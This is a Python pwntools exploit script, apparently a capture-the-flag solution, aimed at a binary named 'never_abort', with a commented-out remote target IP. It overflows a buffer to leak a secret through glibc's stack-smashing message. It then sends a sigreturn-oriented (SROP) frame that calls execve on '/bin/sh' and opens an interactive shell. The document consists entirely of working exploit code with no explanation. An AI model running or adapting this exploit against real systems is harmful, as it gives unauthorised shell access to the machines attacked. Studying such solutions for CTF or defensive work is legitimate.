#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.arch="amd64"
context.log_level = "debug"

p = process("./never_abort")
#p = remote("124.16.75.162", 40001)

p.recv()
time.sleep(0.1)

pay1 = "/bin/sh\x00"
pay1 = pay1.ljust(0x20, "\x00") #0x602120
pay1 += "LIBC_FATAL_STDERR_=1" #6021404

p.sendline(pay1)

p.recv()
time.sleep(0.1)
pay2 = "a" * 0x80 + "a" * (8 * 17) + p64(0x6022b0) + p64(0) + p64(0x602140) + "a" * 0x10
wait('me')

p.sendline(pay2)

data = p.recv()

secret = data.split("***: ")[1].split(" terminated")[0]
print secret

sigframe = SigreturnFrame(kernel="amd64")
sigframe.rdi = 0x602120
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = 0x400850
sigframe.rax = 0x3b
sigframe.csgsfs  = 0xa033

p.sendline("x" * 0x130 + "a" * (0x40 - 56) + str(sigframe)[8:])
p.recvuntil("secret?? ")
p.send(secret)
p.interactive()
